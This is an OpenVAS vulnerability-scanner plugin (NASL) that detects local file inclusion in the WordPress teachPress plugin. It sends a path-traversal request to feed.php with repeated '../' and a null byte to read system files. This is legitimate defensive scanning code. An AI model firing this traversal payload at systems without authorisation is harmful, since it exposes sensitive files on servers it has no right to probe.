###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_50105.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WordPress teachPress 'root' Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The teachPress plug-in for WordPress is prone to multiple local file
include vulnerabilities because it fails to adequately validate user-
supplied input.

An attacker can exploit these vulnerabilities to obtain potentially
sensitive information and execute arbitrary local scripts. This could
allow the attacker to compromise the application and the computer;
other attacks are also possible.

teachPress 2.3.2 is vulnerable; prior versions may also be affected.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103303";
CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)");
 script_bugtraq_id(50105);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("WordPress teachPress 'root' Multiple Local File Include Vulnerabilities");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("wordpress/installed");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50105");
 script_xref(name : "URL" , value : "http://plugins.trac.wordpress.org/changeset/405672/teachpress/trunk/export.php?old=340149&old_path=teachpress%2Ftrunk%2Fexport.php");
 script_xref(name : "URL" , value : "http://plugins.trac.wordpress.org/changeset/405672/teachpress/trunk/feed.php?old=340149&old_path=teachpress%2Ftrunk%2Ffeed.php");
 script_xref(name : "URL" , value : "http://wordpress.org/");
 script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/teachpress/");
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
files = traversal_files();

foreach file (keys(files)) { 

  url = string(dir,"/wp-content/plugins/teachpress/feed.php?root=",crap(data:"../",length:9*3),files[file],"%00"); 
 
  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

